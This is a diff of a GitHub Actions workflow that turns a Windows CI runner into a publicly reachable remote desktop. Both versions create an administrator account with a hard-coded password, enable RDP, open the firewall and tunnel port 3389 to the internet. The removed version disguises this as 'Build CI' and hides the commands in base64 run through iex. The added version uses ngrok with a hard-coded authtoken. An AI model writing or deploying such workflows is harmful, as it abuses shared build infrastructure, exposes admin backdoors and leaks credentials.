@@ -1,34 +1,27 @@
-name: Build CI
+name: Windows RDP
 
 on: [workflow_dispatch]
 
 jobs:
   build:
     runs-on: windows-latest
-    timeout-minutes: 350
 
     steps:
-    - name: Setup environment
-      shell: powershell
+    - name: Enable RDP
       run: |
-        $e = [System.Text.Encoding]::UTF8
-        $b = [System.Convert]::FromBase64String("bmV0IHVzZXIgcnVubmVyYWRtaW4gUEBzc3cwcmQhMjAyNg==")
-        iex ($e.GetString($b))
-        $b2 = [System.Convert]::FromBase64String("bmV0IGxvY2FsZ3JvdXAgYWRtaW5pc3RyYXRvcnMgcnVubmVyYWRtaW4gL2FkZA==")
-        iex ($e.GetString($b2))
-        $b3 = [System.Convert]::FromBase64String("cmVnIGFkZCAiSEtMTVxTWVNURU1cQ3VycmVudENvbnRyb2xTZXRcQ29udHJvbFxUZXJtaW5hbCBTZXJ2ZXIiIC92IGZEZW55VFNDb25uZWN0aW9ucyAvdCBSRUdfRFdPUkQgL2QgMCAvZg==")
-        iex ($e.GetString($b3))
-        $b4 = [System.Convert]::FromBase64String("RW5hYmxlLU5ldEZpcmV3YWxsUnVsZSAtRGlzcGxheUdyb3VwICJSZW1vdGUgRGVza3RvcCI=")
-        iex ($e.GetString($b4))
+        net user runneradmin MyPassword123!
+        net localgroup administrators runneradmin /add
+        reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+        Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
 
-    - name: Setup tunnel
-      shell: powershell
+    - name: Download and Set up Ngrok
       run: |
-        Invoke-WebRequest "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe" -OutFile cf.exe
-        Start-Process -FilePath .\cf.exe -ArgumentList "tunnel","--url","tcp://localhost:3389" -NoNewWindow -RedirectStandardOutput tunnel.log
-        Start-Sleep -Seconds 10
-        Get-Content tunnel.log | Select-String "trycloudflare"
+        Invoke-WebRequest https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-stable-windows-amd64.zip -OutFile ngrok.zip
+        Expand-Archive ngrok.zip -DestinationPath .
+        .\ngrok.exe authtoken 3F9V22wCFIs4wZQjS7oXr7xxVJr_22a5Fae19dMWFdcbDT6BM
 
-    - name: Wait
-      run: |
-        ping -n 21600 127.0.0.1 > nul
+    - name: Start Ngrok Tunnel
+      run: .\ngrok.exe tcp 3389
+
+    - name: Keep Alive
+      run: timeout /t 999999
